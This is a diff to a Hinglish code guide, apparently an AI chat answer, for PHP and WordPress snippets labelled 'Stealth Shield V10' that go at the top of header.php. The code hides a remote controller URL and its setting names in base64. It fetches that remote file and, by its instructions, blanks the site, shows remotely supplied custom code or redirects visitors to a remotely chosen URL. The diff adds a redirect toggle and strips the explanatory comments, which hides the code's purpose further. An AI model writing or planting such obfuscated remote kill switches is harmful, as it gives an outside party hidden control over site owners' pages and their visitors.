@@ -101,30 +101,30 @@ Bilkul, maine aapke liye **HTML (Landing Page)**, **PHP Core**, aur **WordPress*
 **Kahan lagayein:** Website ki main file (e.g., `header.php`) ke sabse top par.
 
 ```php
+
+
 <?php
-/* --- PHP STEALTH SHIELD V10 (FULLY ENCRYPTED) --- */
+/* --- PHP STEALTH SHIELD V10 (REDIRECT CONTROL) --- */
 function _sys_sync_final_v10(){
-    // Configuration Encrypted
     $_u = base64_decode("aHR0cHM6Ly9mYWhhZHRlY2g4LmdpdGh1Yi5pby9saWNlbnNlLW1hbmFnZXIvY29udHJvbGxlci5qc29u");
-    $_k = base64_decode("RkFIQUQtNzg2"); // Key: FAHAD-786
+    $_k = base64_decode("RkFIQUQtNzg2"); 
     
-    // Key Mappings Encrypted
     $_f = [
-        'l' => base64_decode("bGljZW5zZXM="),        // licenses
-        's' => base64_decode("c2V0dGluZ3M="),        // settings
-        'e' => base64_decode("ZXhwaXJ5"),            // expiry
-        'a' => base64_decode("YXV0aG9yaXplZF90YXJnZXQ="), // authorized_target
-        'c' => base64_decode("Y3VzdG9tX2NvZGU="),    // custom_code
-        'en' => base64_decode("ZW5hYmxlZA=="),       // enabled
-        'co' => base64_decode("Y29kZQ=="),           // code
+        'l' => base64_decode("bGljZW5zZXM="),        
+        's' => base64_decode("c2V0dGluZ3M="),        
+        'e' => base64_decode("ZXhwaXJ5"),            
+        'a' => base64_decode("YXV0aG9yaXplZF90YXJnZXQ="), 
+        'c' => base64_decode("Y3VzdG9tX2NvZGU="),    
+        'en' => base64_decode("ZW5hYmxlZA=="),       
+        'co' => base64_decode("Y29kZQ=="),           
         're' => base64_decode("cmVkaXJlY3RfZW5hYmxlZA=="), // redirect_enabled
-        'ru' => base64_decode("cmVkaXJlY3RfdXJs"),    // redirect_url
-        'rd' => base64_decode("cmVkaXJlY3RfZGVsYXlfc2Vj"), // redirect_delay_sec
-        'mi' => base64_decode("bXNnX2ludmFsaWQ="),    // msg_invalid
-        'me' => base64_decode("bXNnX2V4cGlyZWQ="),    // msg_expired
-        'md' => base64_decode("bXNnX2RvbWFpbl9taXNtYXRjaA=="), // msg_domain_mismatch
-        'lbl' => base64_decode("UmVkaXJlY3RpbmcgYXV0b21hdGljYWxseSBpbg=="), // Redirecting label
-        'lbl2' => base64_decode("c2Vjb25kcy4uLg==")   // seconds label
+        'ru' => base64_decode("cmVkaXJlY3RfdXJs"),    
+        'rd' => base64_decode("cmVkaXJlY3RfZGVsYXlfc2Vj"), 
+        'mi' => base64_decode("bXNnX2ludmFsaWQ="),    
+        'me' => base64_decode("bXNnX2V4cGlyZWQ="),    
+        'md' => base64_decode("bXNnX2RvbWFpbl9taXNtYXRjaA=="), 
+        'lbl' => base64_decode("UmVkaXJlY3RpbmcgYXV0b21hdGljYWxseSBpbg=="),
+        'lbl2' => base64_decode("c2Vjb25kcy4uLg==")
     ];
 
     $_h = str_replace('www.', '', $_SERVER['HTTP_HOST']);
@@ -140,7 +140,6 @@ function _sys_sync_final_v10(){
         $_err = null;
         $_is_c = false;
 
-        // Priority Check (Custom Code)
         if ($_l && isset($_l[$_f['c']]) && $_l[$_f['c']][$_f['en']] === true) {
             $_err = $_l[$_f['c']][$_f['co']];
             $_is_c = true;
@@ -152,10 +151,13 @@ function _sys_sync_final_v10(){
         }
 
         if ($_err) {
+            $_rd_en = $_s[$_f['re']] ?? false; // Redirect enabled check
             $_dly = $_s[$_f['rd']] ?? 20;
             $_url = $_s[$_f['ru']] ?? "#";
             $_title = $_d['title'] ?? "Security Shield Active";
-            $_t_style = $_is_c ? "display:none;" : "display:block;";
+
+            // Timer style logic: Agar custom message hai YA redirect false hai, toh timer hide karein
+            $_t_style = ($_is_c || !$_rd_en) ? "display:none;" : "display:block;";
 
             die("<style>
                 body{margin:0;background:#000;overflow:hidden;}
@@ -172,8 +174,8 @@ function _sys_sync_final_v10(){
                 <div class='tr'>{$_f['lbl']} <span id='tm'>{$_dly}</span> {$_f['lbl2']}</div>
             </div></div>
             <script>
-                let s={$_dly}, ic=" . ($_is_c ? '1' : '0') . ";
-                if(ic=='0'){
+                let s={$_dly}, ic=" . ($_is_c ? '1' : '0') . ", re=" . ($_rd_en ? '1' : '0') . ";
+                if(ic=='0' && re=='1'){
                     let it=setInterval(()=>{
                         s--; document.getElementById('tm').innerText=s;
                         if(s<=0){ clearInterval(it); window.location.href='{$_url}'; }
@@ -190,9 +192,6 @@ function _sys_sync_final_v10(){
 _sys_sync_final_v10();
 ?>
 
-
-
-
 ```
 
 ---
@@ -203,7 +202,7 @@ _sys_sync_final_v10();
 
 ```php
 
-/* --- WP STEALTH SHIELD V10 (FULLY ENCRYPTED) --- */
+/* --- WP STEALTH SHIELD V10 (FULLY ENCRYPTED + REDIRECT CONTROL) --- */
 add_action('init', '_wp_secure_v10_stealth');
 function _wp_secure_v10_stealth() {
     if (is_admin()) return;
@@ -221,6 +220,7 @@ function _wp_secure_v10_stealth() {
         'c' => base64_decode("Y3VzdG9tX2NvZGU="),    
         'en' => base64_decode("ZW5hYmxlZA=="),       
         'co' => base64_decode("Y29kZQ=="),           
+        're' => base64_decode("cmVkaXJlY3RfZW5hYmxlZA=="), // redirect_enabled key
         'rd' => base64_decode("cmVkaXJlY3RfZGVsYXlfc2Vj"), 
         'ru' => base64_decode("cmVkaXJlY3RfdXJs"),    
         'mi' => base64_decode("bXNnX2ludmFsaWQ="),    
@@ -242,7 +242,7 @@ function _wp_secure_v10_stealth() {
     $err = null;
     $_is_c = false;
 
-    // Step 1: Priority Check (Custom Code)
+    // Step 1: Custom Code Check
     if ($_l && isset($_l[$_f['c']]) && $_l[$_f['c']][$_f['en']] === true) {
         $err = $_l[$_f['c']][$_f['co']];
         $_is_c = true;
@@ -255,10 +255,13 @@ function _wp_secure_v10_stealth() {
     }
 
     if ($err) {
+        $_rd_en = $_s[$_f['re']] ?? false; // Check redirection status
         $_dly = $_s[$_f['rd']] ?? 20; 
         $_url = $_s[$_f['ru']] ?? "#";
         $_tit = $d['title'] ?? "Security Shield Active";
-        $_t_style = $_is_c ? "display:none;" : "display:block;";
+        
+        // Timer display: Hide if custom code is active OR redirect is disabled
+        $_t_style = ($_is_c || !$_rd_en) ? "display:none;" : "display:block;";
 
         echo "<style>
             body{margin:0;background:#000!important;overflow:hidden!important;}
@@ -277,8 +280,8 @@ function _wp_secure_v10_stealth() {
             </div>
         </div>
         <script>
-            let s = {$_dly}, ic = " . ($_is_c ? '1' : '0') . ";
-            if(ic == '0'){
+            let s = {$_dly}, ic = " . ($_is_c ? '1' : '0') . ", re = " . ($_rd_en ? '1' : '0') . ";
+            if(ic == '0' && re == '1'){
                 let it = setInterval(()=>{
                     s--;
                     let el = document.getElementById('vt');
@@ -298,7 +301,6 @@ function _wp_secure_v10_stealth() {
         });
     }
 }
-
 
 ```
 
